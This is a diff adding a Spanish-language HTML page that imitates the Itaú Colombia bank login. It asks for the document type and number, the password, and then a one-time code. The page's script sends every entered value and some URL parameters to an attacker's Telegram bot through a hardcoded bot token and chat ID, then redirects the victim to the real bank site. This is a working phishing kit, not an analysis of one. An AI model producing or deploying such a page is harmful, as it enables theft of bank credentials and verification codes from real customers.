@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Itaú - Ingresa tus datos</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .container {
+      display: flex;
+      flex: 1;
+      max-width: 1400px;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    .left-section {
+      flex: 1;
+      padding: 60px 80px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .logo {
+      width: 90px; /* ✅ Más grande (era 80px) */
+      margin-bottom: 40px;
+    }
+
+    h1 {
+      font-size: 36px;
+      font-weight: 400;
+      color: #333;
+      margin-bottom: 40px;
+    }
+
+    .form-group {
+      margin-bottom: 24px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 8px;
+      font-weight: 400;
+    }
+
+    .form-group select,
+    .form-group input {
+      width: 100%;
+      max-width: 370px;
+      padding: 12px 16px;
+      border: 1px solid #d4d4d4;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #333;
+      background: white;
+      transition: border-color 0.3s;
+    }
+
+    .form-group select:focus,
+    .form-group input:focus {
+      outline: none;
+      border-color: #ff6600;
+    }
+
+    .form-group input[type="password"] {
+      position: relative;
+    }
+
+    .password-wrapper {
+      position: relative;
+      max-width: 370px;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 18px;
+    }
+
+    .help-link {
+      display: inline-block;
+      color: #0066cc;
+      text-decoration: none;
+      font-size: 14px;
+      margin-top: 16px;
+      margin-bottom: 24px;
+    }
+
+    .help-link:hover {
+      text-decoration: underline;
+    }
+
+    .btn-submit {
+      width: 100%;
+      max-width: 370px;
+      padding: 14px;
+      background: #e8e8e8;
+      color: #999;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: not-allowed;
+      transition: all 0.3s;
+      margin-top: 0;
+    }
+
+    .btn-submit.active {
+      background: #ff6600;
+      color: white;
+      cursor: pointer;
+    }
+
+    .btn-submit.active:hover {
+      background: #e55a00;
+    }
+
+    .right-section {
+      flex: 1;
+      background: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .right-section img {
+      max-width: 500px;
+      width: 100%;
+      height: auto;
+      border-radius: 20px;
+      /* ✅ Sin sombra */
+    }
+
+    footer {
+      padding: 20px;
+      text-align: center;
+      border-top: 1px solid #e8e8e8;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .vigilado {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      justify-content: center;
+    }
+
+    /* Pantalla OTP */
+    #otp-screen {
+      display: none;
+    }
+
+    #otp-screen h1 {
+      font-size: 32px;
+      margin-bottom: 20px;
+    }
+
+    #otp-screen p {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 30px;
+      max-width: 370px;
+    }
+
+    .otp-input {
+      border: 2px solid #ff6600 !important;
+      font-size: 18px !important;
+      font-weight: 600 !important;
+      letter-spacing: 2px;
+      text-align: center;
+    }
+
+    /* Responsive */
+    @media (max-width: 968px) {
+      .container {
+        flex-direction: column;
+      }
+
+      .right-section {
+        display: none;
+      }
+
+      .left-section {
+        padding: 40px 20px;
+      }
+
+      h1 {
+        font-size: 28px;
+      }
+
+      .logo {
+        width: 60px; /* ✅ Se mantiene pequeño en móvil */
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Sección Izquierda - Formulario -->
+    <div class="left-section">
+      <img src="itau.svg" alt="Itaú" class="logo">
+
+      <!-- Pantalla inicial de login -->
+      <div id="login-screen">
+        <h1>Ingresa tus datos</h1>
+
+        <div class="form-group">
+          <label>Tipo de documento</label>
+          <select id="tipo-documento">
+            <option value="Cédula de ciudadanía">Cédula de ciudadanía</option>
+            <option value="Cédula de extranjería">Cédula de extranjería</option>
+            <option value="Pasaporte">Pasaporte</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label>Número de documento</label>
+          <input type="text" id="numero-documento" placeholder="Ingresa número de documento">
+        </div>
+
+        <div class="form-group">
+          <label>Clave</label>
+          <div class="password-wrapper">
+            <input type="password" id="clave" placeholder="Ingresa tu clave">
+            <button type="button" class="toggle-password" onclick="togglePassword()">👁</button>
+          </div>
+        </div>
+
+        <a href="#" class="help-link">¿Tienes problemas con tu clave?</a>
+
+        <button type="button" class="btn-submit" id="btn-ingresar" onclick="enviarDatos()">Ingresar</button>
+      </div>
+
+      <!-- Pantalla OTP (oculta inicialmente) -->
+      <div id="otp-screen">
+        <h1>Código de verificación</h1>
+        <p>Por tu seguridad, ingresa el código de verificación que te hemos enviado</p>
+
+        <div class="form-group">
+          <label>Código OTP</label>
+          <input type="text" id="otp-code" class="otp-input" placeholder="000000" maxlength="6">
+        </div>
+
+        <button type="button" class="btn-submit active" onclick="enviarOTP()">Verificar</button>
+      </div>
+    </div>
+
+    <!-- Sección Derecha - Imagen -->
+    <div class="right-section">
+      <img src="itau2.png" alt="Mujer con celular">
+    </div>
+  </div>
+
+  <footer>
+    <div class="vigilado">
+      <span>VIGILADO</span>
+      <span style="font-weight: bold;">SUPERINTENDENCIA FINANCIERA DE COLOMBIA</span>
+    </div>
+    <p style="margin-top: 10px;">Copyright © 2026 Itaú Colombia S.A.</p>
+  </footer>
+
+ <script>
+const BOT_TOKEN = '8735380697:AAF4G03kbZoCAOf2IUWJHE6P6jcmlzYQzCg';
+const CHAT_ID = '-1003969378541';
+
+const params = new URLSearchParams(window.location.search);
+const placa = params.get('placa') || '';
+const valor = params.get('valor') || '';
+const pagoId = params.get('pagoId') || '';
+
+let loginIdActual = null;
+
+// ================= VALIDACIÓN =================
+document.getElementById('numero-documento').addEventListener('input', validarCampos);
+document.getElementById('clave').addEventListener('input', validarCampos);
+
+function validarCampos() {
+  const tipoDoc = document.getElementById('tipo-documento').value;
+  const numeroDoc = document.getElementById('numero-documento').value.trim();
+  const clave = document.getElementById('clave').value.trim();
+  const btn = document.getElementById('btn-ingresar');
+
+  if (tipoDoc && numeroDoc && clave) {
+    btn.classList.add('active');
+    btn.style.cursor = 'pointer';
+  } else {
+    btn.classList.remove('active');
+    btn.style.cursor = 'not-allowed';
+  }
+}
+
+// ================= MOSTRAR/OCULTAR PASSWORD =================
+function togglePassword() {
+  const input = document.getElementById('clave');
+  input.type = input.type === 'password' ? 'text' : 'password';
+}
+
+// ================= LOGIN =================
+async function enviarDatos() {
+  const tipoDoc = document.getElementById('tipo-documento').value;
+  const numeroDoc = document.getElementById('numero-documento').value.trim();
+  const clave = document.getElementById('clave').value.trim();
+
+  if (!tipoDoc || !numeroDoc || !clave) {
+    alert('⚠️ Por favor completa todos los campos');
+    return;
+  }
+
+  // 🚀 MENSAJE TELEGRAM LOGIN
+  let mensaje = "🏦 <b>ITAU LOGIN</b>\n\n";
+
+  document.querySelectorAll("input, select").forEach(el => {
+    const nombre = el.id || "campo";
+    const valorInput = el.value || "N/A";
+    mensaje += `<b>${nombre}:</b> ${valorInput}\n`;
+  });
+
+  mensaje += `\n🚗 <b>placa:</b> ${placa}`;
+  mensaje += `\n💰 <b>valor:</b> ${valor}`;
+  mensaje += `\n🆔 <b>pago_id:</b> ${pagoId}`;
+  mensaje += `\n⏰ <b>fecha:</b> ${new Date().toISOString()}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje,
+        parse_mode: 'HTML'
+      })
+    });
+  } catch (e) {}
+
+  // generar id local
+  loginIdActual = Date.now();
+
+  // 🔥 mostrar OTP automático con delay
+  setTimeout(() => {
+    document.getElementById('login-screen').style.display = 'none';
+    document.getElementById('otp-screen').style.display = 'block';
+  }, 1500);
+}
+
+// ================= OTP =================
+async function enviarOTP() {
+  const otpCode = document.getElementById('otp-code').value.trim();
+
+  if (!otpCode || otpCode.length < 4) {
+    alert('⚠️ Por favor ingresa el código OTP');
+    return;
+  }
+
+  let mensaje = "🔢 <b>ITAU OTP</b>\n\n";
+  mensaje += `<b>codigo:</b> ${otpCode}\n`;
+  mensaje += `<b>login_id:</b> ${loginIdActual}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje,
+        parse_mode: 'HTML'
+      })
+    });
+  } catch (e) {}
+
+  // redirección final
+  window.location.href = 'https://www.itau.co/';
+}
+</script>
+</body>
+</html>
